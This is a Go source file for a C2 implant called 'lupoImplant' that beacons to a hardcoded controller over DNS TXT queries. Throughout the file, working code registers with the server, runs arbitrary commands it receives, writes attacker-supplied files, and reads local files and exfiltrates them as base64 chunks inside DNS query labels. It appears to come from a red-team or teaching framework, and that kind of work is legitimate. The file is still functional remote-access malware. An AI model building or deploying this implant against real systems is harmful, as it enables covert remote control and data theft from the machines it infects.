package main

import (
	"encoding/base64"
	"fmt"
	"log"
	"strings"
	"time"
	"encoding/json"
	"strconv"
	"io/ioutil"
	"runtime"
	"os"
	"os/exec"
	"github.com/mattn/go-shellwords"
	"github.com/miekg/dns"
)


// Configuration
type lupoImplant struct {
	updateInterval int
	protocol       string
	dns_domain     string
	rhost          string
	rport          int
	id             int
	uuid           string
	psk            string
	data           string
	pendingFileName    string
	pendingFileContent string
}

var implant *lupoImplant

func main() {


	implant = &lupoImplant{
		updateInterval: 1,
		protocol:       "DNS",
		dns_domain:     "example.com.",
		rhost:          "192.168.3.227",
		rport:          1337,
		id:             -1,
		uuid:           "",
		psk:            "wolfpack",
		data:           "",
	}

	for {
		ExecLoop(implant)
		time.Sleep(time.Duration(implant.updateInterval) * time.Second)
	}
}


func ExecLoop(implant *lupoImplant) {
	if implant.id == -1 {
		// Registration message
		regMsg := map[string]interface{}{
			"psk":      implant.psk,
			"register": true,
			"update":   implant.updateInterval,
			"arch":     getArchitecture(),
			"functions": buildCustomFunctions(),
		}

		fmt.Println(regMsg)

		jsonMsg, err := json.Marshal(regMsg)
		if err != nil {
			log.Printf("Failed to marshal registration: %v", err)
			return
		}

		fmt.Println(string(jsonMsg))

		resp, err := sendDNSMessage(implant, string(jsonMsg))
		if err != nil {
			log.Printf("Failed to send registration: %v", err)
			return
		}

		fmt.Println("Response: ", resp)

		// Parse registration response (server returns plain JSON in TXT)
		if resp != "" {
			serverResp, err := parseResponse(resp)
			if err != nil {
				log.Printf("Failed to parse response: %v", err)
				log.Printf("Raw response was: %s", resp)
				return
			}

			// Safely extract sessionID and UUID
			if sid, ok := serverResp["sessionID"]; ok && sid != nil {
				if sidf, ok := sid.(float64); ok {
					implant.id = int(sidf)
				} else if sids, ok := sid.(string); ok {
					if vi, err := strconv.Atoi(sids); err == nil {
						implant.id = vi
					}
				}
			} else {
				log.Printf("Registration response missing sessionID, raw: %v", serverResp)
				return
			}

			if uuidv, ok := serverResp["UUID"]; ok && uuidv != nil {
				if ustr, ok := uuidv.(string); ok {
					implant.uuid = ustr
				}
			}
		}
		return
	}

	// Regular check-in message
	checkInMsg := map[string]interface{}{
		"psk":       implant.psk,
		"sessionID": implant.id,
		"UUID":      implant.uuid,
	}

	// Add any pending command output (send raw string; server will display or forward)
	if implant.data != "" {
		checkInMsg["data"] = implant.data
		implant.data = "" // Clear after sending
	}

	// If we have a pending file to upload to server (from a download command), include it
	if implant.pendingFileName != "" && implant.pendingFileContent != "" {
		checkInMsg["filename"] = implant.pendingFileName
		checkInMsg["file"] = implant.pendingFileContent
		implant.pendingFileName = ""
		implant.pendingFileContent = ""
	}

	// Include update interval and arch to mirror HTTP implant behavior
	checkInMsg["update"] = implant.updateInterval
	checkInMsg["arch"] = getArchitecture()

	jsonMsg, err := json.Marshal(checkInMsg)
	if err != nil {
		log.Printf("Failed to marshal check-in: %v", err)
		return
	}

	resp, err := sendDNSMessage(implant, string(jsonMsg))
	if err != nil {
		log.Printf("Failed to send check-in: %v", err)
		return
	}

	// Handle server command
	if resp != "" {
		decodedResp, err := base64.RawURLEncoding.DecodeString(resp)
		if err != nil {
			log.Printf("base64 decode failed: %v", err)
			return
		}
		resp = string(decodedResp)
		fmt.Println("Decoded response: ", resp)
		
		var cmdResp map[string]interface{}
		if err := json.Unmarshal([]byte(resp), &cmdResp); err != nil {
			log.Printf("Failed to parse command: %v", err)
			log.Printf("Raw response was: %s", resp)
			return
		}

		// If server requested session reconnect, update id/uuid
		if uuidVal, ok := cmdResp["UUID"]; ok && uuidVal != nil {
			// Safely extract sessionID
			if sid, ok := cmdResp["sessionID"]; ok && sid != nil {
				if sidf, ok := sid.(float64); ok {
					implant.id = int(sidf)
				} else if sids, ok := sid.(string); ok {
					if vi, err := strconv.Atoi(sids); err == nil {
						implant.id = vi
					}
				}
			}
			if ustr, ok := uuidVal.(string); ok {
				implant.uuid = ustr
			}
			return
		}

		if cmdv, ok := cmdResp["cmd"]; ok && cmdv != nil {
			if cmd, ok := cmdv.(string); ok && cmd != "" {
			// Parse command into parts
			parsedCmd, err := shellwords.Parse(cmd)
			if err != nil || len(parsedCmd) == 0 {
				log.Printf("Failed to parse command string: %v", err)
				return
			}

			root := parsedCmd[0]
			args := parsedCmd[1:]

			if root == "upload" {
				if len(args) < 2 {
					implant.data = "upload: missing arguments"
				} else {
					filename := args[0]
					encData := strings.Join(args[1:], " ")
					// Try StdEncoding then RawURLEncoding
					var fileBytes []byte
					fileBytes, err = base64.StdEncoding.DecodeString(encData)
					if err != nil {
						fileBytes, err = base64.RawURLEncoding.DecodeString(encData)
					}
					if err != nil {
						implant.data = "upload: decode failed: " + err.Error()
					} else {
						if err := ioutil.WriteFile(filename, fileBytes, 0644); err != nil {
							implant.data = "upload: write failed: " + err.Error()
						} else {
							implant.data = "upload: saved " + filename
						}
					}
				}
			} else if root == "download" {
				if len(args) < 1 {
					implant.data = "download: missing filename"
				} else {
					filename := args[0]
					b, err := ioutil.ReadFile(filename)
					if err != nil {
						implant.data = "download: read failed: " + err.Error()
					} else {
						// Use StdEncoding to be compatible with HTTP implant
						enc := base64.StdEncoding.EncodeToString(b)
						implant.pendingFileName = filename
						implant.pendingFileContent = enc
					}
				}
			} else {
				// Execute arbitrary command (with args)
				output := executeCommand(strings.Join(parsedCmd, " "))
				implant.data = output
			}
			}
		}
	}
}

// parseResponse tries to unmarshal a TXT reply that may be raw JSON, a quoted
// JSON string, or an escaped JSON without outer quotes. Returns a map on
// success.
func parseResponse(resp string) (map[string]interface{}, error) {


	decodedResp, err := base64.RawURLEncoding.DecodeString(resp)
	if err != nil {
		return nil, fmt.Errorf("base64 decode failed: %v", err)
	}
	resp = string(decodedResp)
	fmt.Println("Decoded response: ", resp)
	var m map[string]interface{}
	if err := json.Unmarshal([]byte(resp), &m); err == nil {
		return m, nil
	}

	// Try unquoting (handles escaped JSON like {\"key\":...})
	if u, err := strconv.Unquote("\"" + resp + "\""); err == nil {
		if err2 := json.Unmarshal([]byte(u), &m); err2 == nil {
			return m, nil
		}
	}

	// Maybe it's a quoted JSON string: "{\"key\":...}"
	var inner string
	if err := json.Unmarshal([]byte(resp), &inner); err == nil {
		if err2 := json.Unmarshal([]byte(inner), &m); err2 == nil {
			return m, nil
		}
	}

	return nil, fmt.Errorf("could not parse server response as JSON")
}

// parseServerJSON attempts to parse either a raw JSON object or a
// JSON-encoded string that contains the object (double-encoded).
// parsing simplified: server returns proper JSON; use direct unmarshal

func executeCommand(cmd string) string {
	// Parse the command into words
	parsed, err := shellwords.Parse(cmd)
	if err != nil || len(parsed) == 0 {
		return "Failed to parse command: " + err.Error()
	}

	root := parsed[0]
	args := parsed[1:]

	// Builtin placeholders
	if root == "cd" {
		if len(args) > 0 {
			if err := os.Chdir(strings.Join(args, " ")); err != nil {
				return "cd failed: " + err.Error()
			}
			return ""
		}
		return "cd: missing argument"
	}

	if root == "rootme" {
		return "you're not good enough to be root :("
	}

	if root == "other_func" {
		return "this does nothing it's just a placeholder :)"
	}

	if root == "updateinterval" {
		if len(args) > 0 {
			if v, err := strconv.Atoi(args[0]); err == nil {
				implant.updateInterval = v
				return "Implant interval updated to: " + strconv.Itoa(v)
			} else {
				return "updateinterval: invalid value"
			}
		}
		return "updateinterval: missing value"
	}

	// Execute external command
	out, err := exec.Command(root, args...).Output()
	if err != nil {
		return "Command execution failed: " + err.Error()
	}
	return string(out)
}

func sendDNSMessage(implant *lupoImplant, message string) (string, error) {
	// Encode the whole JSON message using RawURLEncoding (no padding), then chunk it
	encodedMsg := base64.RawURLEncoding.EncodeToString([]byte(message))

	fmt.Println(encodedMsg)

	const maxChunkSize = 40
	chunks := make([]string, 0)
	for i := 0; i < len(encodedMsg); i += maxChunkSize {
		end := i + maxChunkSize
		if end > len(encodedMsg) {
			end = len(encodedMsg)
		}
		chunks = append(chunks, encodedMsg[i:end])
	}

	connectionString := fmt.Sprintf("%s:%d", implant.rhost, implant.rport)
	totalChunks := len(chunks)
	serverResp := ""

	for i, chunk := range chunks {
		// Use hyphen-separated first label: <sessionID>-<chunkIndex>-<totalChunks>-<chunkPayload>
		sessionID := implant.id
		if sessionID == -1 {
			sessionID = 0
		}
		label := fmt.Sprintf("%d-%d-%d-%s", sessionID, i, totalChunks, chunk)
		fqdn := fmt.Sprintf("%s.%s", label, implant.dns_domain)

		msg := new(dns.Msg)
		msg.SetQuestion(fqdn, dns.TypeTXT)
		msg.RecursionDesired = false

		c := new(dns.Client)
		c.Timeout = 5 * time.Second
		resp, _, err := c.Exchange(msg, connectionString)
		if err != nil {
			return "", fmt.Errorf("DNS query failed: %v", err)
		}

		// Process server response: server returns plain JSON in TXT for non-ack responses
		if resp != nil && len(resp.Answer) > 0 {
			if txt, ok := resp.Answer[0].(*dns.TXT); ok {
				serverResp = strings.Join(txt.Txt, "")
				if serverResp != "chunk received" {
					// Expect plain JSON
					break
				}
			}
		}

		fmt.Println(fqdn)

		time.Sleep(100 * time.Millisecond)
	}

	return serverResp, nil
}

// Add this new helper function
func sanitizeDNSLabel(s string) string {
    // Remove any characters that could cause DNS issues
    s = strings.Map(func(r rune) rune {
        if (r >= 'a' && r <= 'z') ||
           (r >= 'A' && r <= 'Z') ||
           (r >= '0' && r <= '9') ||
           r == '-' {
            return r
        }
        return '-'
    }, s)

    // Ensure label isn't too long
    if len(s) > 63 {
        return s[:63]
    }

    // Remove consecutive hyphens
    for strings.Contains(s, "--") {
        s = strings.ReplaceAll(s, "--", "-")
    }

    // Ensure label doesn't start or end with hyphen
    s = strings.Trim(s, "-")

    if s == "" {
        return "x" // Ensure we never return empty label
    }

    return s
}

func encodeBase64(input string) string {
	return base64.RawURLEncoding.EncodeToString([]byte(input))
}


func getArchitecture() string {

	arch := runtime.GOOS + "/" + runtime.GOARCH

	return arch

}

func buildCustomFunctions() string {
	custom_functions := []string{
		"\"rootme\":\"gives instant root every time\"",
		"\"other_func\":\"does funky things\""}

	customFunctionStr := "{"
	for index, custom_fun := range custom_functions {

		if index == len(custom_functions)-1 {
			customFunctionStr += custom_fun
		} else {
			customFunctionStr += custom_fun + ","
		}

	}
	customFunctionStr += "}"

	return customFunctionStr
}


func chunkString(data string, maxPayload int) []string {
	chunks := []string{}
	totalChunks := (len(data) + maxPayload - 1) / maxPayload

	for i := 0; i < totalChunks; i++ {
		start := i * maxPayload
		end := start + maxPayload
		if end > len(data) {
			end = len(data)
		}
		chunkData := data[start:end]
		prefix := fmt.Sprintf("%d-%d-", i, totalChunks)
		chunks = append(chunks, prefix+chunkData)
	}

	return chunks
}

